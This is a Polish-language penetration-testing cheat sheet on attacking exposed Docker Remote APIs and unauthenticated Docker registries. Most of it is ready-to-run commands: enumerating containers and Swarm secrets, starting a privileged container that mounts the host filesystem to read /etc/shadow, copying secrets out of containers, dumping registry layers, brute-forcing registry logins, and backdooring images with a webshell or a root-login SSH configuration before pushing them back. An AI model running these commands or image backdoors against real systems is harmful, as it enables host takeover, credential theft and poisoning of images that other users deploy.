# Docker i Docker Registry -- Pentesting Konteneryzowanych Aplikacji

## 1. Docker API (porty 2375/2376)

### Domyslne dane / brak autentykacji
- **Domyslnie Docker Remote API NIE wymaga autentykacji** -- pelny dostep bez hasel
- Port 2375 = HTTP (plaintext), port 2376 = HTTPS/TLS

### Krytyczne endpointy API
```bash
# Wersja i informacje
curl -s http://<HOST>:2375/version | jq
curl -s http://<HOST>:2375/info | jq

# Lista kontenerow
curl -s http://<HOST>:2375/containers/json | jq

# Lista obrazow
curl -s http://<HOST>:2375/images/json | jq

# Sekrety (Swarm)
curl -s http://<HOST>:2375/secrets | jq

# Lista serwisow
curl -s http://<HOST>:2375/services | jq
```

### Eskalacja uprawnien -- natychmiastowy root na hoscie
```bash
# Montowanie calego systemu plikow hosta
docker -H <HOST>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow

# Alternatywnie przez curl (tworzenie kontenera z montowaniem /)
curl -X POST -H "Content-Type: application/json" \
  http://<HOST>:2375/containers/create?name=pwned \
  -d '{"Image":"alpine","Cmd":["/usr/bin/tail","-f","1234","/dev/null"],"Binds":["/:/mnt"],"Privileged":true}'
```

### Wyszukiwanie sekretow w kontenerach
```bash
docker inspect <container_id>  # sprawdz sekcje Env -- hasla, IP, sciezki
docker cp <container_id>:/etc/<secret_file> .
```

### Automatyzacja
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p 2375 <IP>
```

---

## 2. Docker Registry (port 5000)

### Fingerprinting
- `GET /` -> pusta odpowiedz
- `GET /v2/` -> `{}`
- `GET /v2/_catalog` -> lista repozytoriow LUB blad UNAUTHORIZED

### Brak autentykacji (czesty blad!)
```bash
# Sprawdz czy registry jest otwarte
curl -s http://<HOST>:5000/v2/_catalog
# Wynik: {"repositories":["alpine","ubuntu"]}

# Lista tagow
curl -s http://<HOST>:5000/v2/<repo>/tags/list

# Pobranie manifestu (moze zawierac komendy budowania, sekrety w warstwach)
curl -s http://<HOST>:5000/v2/<repo>/manifests/latest

# Pobranie warstwy (blob) -- moze zawierac pliki konfiguracyjne, hasla
curl http://<HOST>:5000/v2/<repo>/blobs/<sha256:hash> --output blob.tar
tar -xf blob.tar
```

### Brute-force autentykacji
- Jesli wymagana autentykacja: `curl -k -u user:pass https://<HOST>:5000/v2/_catalog`
- Narzedzie: [DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber) -- automatyczny dump

### Backdoorowanie obrazow (krytyczne!)
- Jesli masz dostep push do registry -> **wstrzyknij webshell lub backdoor**:
  ```dockerfile
  FROM <HOST>:5000/wordpress
  COPY shell.php /app/
  RUN chmod 777 /app/shell.php
  ```
  ```bash
  docker build -t <HOST>:5000/wordpress .
  docker push <HOST>:5000/wordpress
  ```
- Analogicznie dla obrazow SSH: zmien `sshd_config` (PermitRootLogin yes) + ustaw haslo root

### Ujawnianie informacji
- Manifesty zawieraja **historie budowania** (komendy Dockerfile, zmienne srodowiskowe)
- Warstwy blobowe moga zawierac **pliki konfiguracyjne, klucze, hasla**
